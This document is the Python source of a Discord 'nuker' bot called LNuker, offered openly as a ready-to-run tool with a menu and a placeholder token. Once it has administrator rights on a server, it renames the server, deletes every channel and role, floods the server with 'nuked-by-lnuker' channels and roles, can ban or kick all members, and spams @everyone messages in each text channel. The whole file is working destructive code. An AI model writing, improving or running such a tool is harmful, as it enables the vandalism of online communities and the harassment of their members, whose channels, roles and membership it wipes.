# farm коммитов
import discord, asyncio, time, os, random, colorama; from colorama import Fore, Style

colorama.init()
client = discord.Client()

@client.event
async def on_ready():
    print(f'{Fore.GREEN}Logged in as {client.user}{Style.RESET_ALL}')
    time.sleep(1.0)
    print(f'{Fore.YELLOW}Wait...{Style.RESET_ALL}')
    time.sleep(2)
    os.system('cls')
    banner()
    await menu()

def banner():
    banner1 = rf"""{Fore.RED}
 ▄█       ███▄▄▄▄   ███    █▄     ▄█   ▄█▄    ▄████████    ▄████████ 
███       ███▀▀▀██▄ ███    ███   ███ ▄███▀   ███    ███   ███    ███ 
███       ███   ███ ███    ███   ███▐██▀     ███    █▀    ███    ███ 
███       ███   ███ ███    ███  ▄█████▀     ▄███▄▄▄      ▄███▄▄▄▄██▀ 
███       ███   ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
███       ███   ███ ███    ███   ███▐██▄     ███    █▄  ▀███████████ 
███▌    ▄ ███   ███ ███    ███   ███ ▀███▄   ███    ███   ███    ███ 
█████▄▄██  ▀█   █▀  ████████▀    ███   ▀█▀   ██████████   ███    ███ 
▀                                ▀                        ███    ███ {Style.RESET_ALL}
"""
    print(banner1)

async def menu():
    while True:
        print(f"{Fore.RED}1. Nuke Server{Style.RESET_ALL}")
        print(f"{Fore.RED}2. Exit{Style.RESET_ALL}")
        choice = input(f"{Fore.RED}Linwy@LNuker ~ {Style.RESET_ALL}")
        if choice == '1':
            os.system('cls')
            server_id = input(f"{Fore.RED}Enter the server ID: {Style.RESET_ALL}")
            guild = client.get_guild(int(server_id))
            if guild and guild.me.guild_permissions.administrator:
                await nuker(guild)
            else:
                print(f"{Fore.RED}Bot is not on the server or does not have administrator permissions!{Style.RESET_ALL}")
                time.sleep(1)
                os.system('cls')
                banner()
        elif choice == '2':
            break
        else:
            print(f"{Fore.RED}Invalid choice, please try again{Style.RESET_ALL}")
            time.sleep(1)
            os.system('cls')
            banner()

async def nuker(guild):
    try:
        await guild.edit(name='LNuker')
        with open('avatar.png', 'rb') as f:
            await guild.edit(avatar=f.read())
        print(f'{Fore.YELLOW}Server name and avatar changed{Style.RESET_ALL}')
    except Exception as e:
        print(f'{Fore.RED}Failed to change server name and avatar: {e}{Style.RESET_ALL}')

    delete_channel_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_channel_tasks)
    print(f'{Fore.YELLOW}Deleted all channels{Style.RESET_ALL}')

    create_channel_tasks = [guild.create_text_channel('nuked-by-lnuker') for _ in range(50 - len([ch for ch in guild.channels if isinstance(ch, discord.TextChannel)]))]
    await asyncio.gather(*create_channel_tasks)
    print(f'{Fore.GREEN}Created {len(create_channel_tasks)} new channels: nuked-by-lnuker{Style.RESET_ALL}')

    delete_role_tasks = []
    for role in guild.roles:
        if role.name != '@everyone':
            delete_role_tasks.append(delete_role(role))
    await asyncio.gather(*delete_role_tasks)

    create_role_tasks = [guild.create_role(name='Nuked by LNuker', color=discord.Color(random.randint(0, 0xFFFFFF))) for _ in range(50 - len(guild.roles))]
    await asyncio.gather(*create_role_tasks)
    print(f'{Fore.GREEN}Created {len(create_role_tasks)} new roles: Nuked by LNuker{Style.RESET_ALL}')

    ban_choice = input(f"{Fore.RED}Ban all members? (y/n): {Style.RESET_ALL}")
    if ban_choice.lower() == 'y':
        ban_tasks = [member.ban(reason='Nuked by LNuker') for member in guild.members]
        await asyncio.gather(*ban_tasks)
        print(f'{Fore.YELLOW}Banned all members{Style.RESET_ALL}')

    kick_choice = input(f"{Fore.RED}Kick all members? (y/n): {Style.RESET_ALL}")
    if kick_choice.lower() == 'y':
        kick_tasks = [member.kick(reason='Nuked by LNuker') for member in guild.members]
        await asyncio.gather(*kick_tasks)
        print(f'{Fore.YELLOW}Kicked all members{Style.RESET_ALL}')

    spam_amount = int(input(f"{Fore.YELLOW}Enter the amount of messages to spam: {Style.RESET_ALL}"))
    spam_tasks = [spam(channel, spam_amount) for channel in guild.text_channels]
    await asyncio.gather(*spam_tasks)

async def spam(channel, spam_amount):
    for _ in range(spam_amount):
        try:
            await channel.send('@everyone Nuked by LNuker')
        except Exception:
            pass

async def delete_role(role):
    try:
        await role.delete()
        print(f'{Fore.YELLOW}Deleted role - {role.name}{Style.RESET_ALL}')
    except Exception as e:
        print(f'{Fore.RED}Failed to delete role: {role.name} - {e}{Style.RESET_ALL}')

client.run('YOURTOKEN')
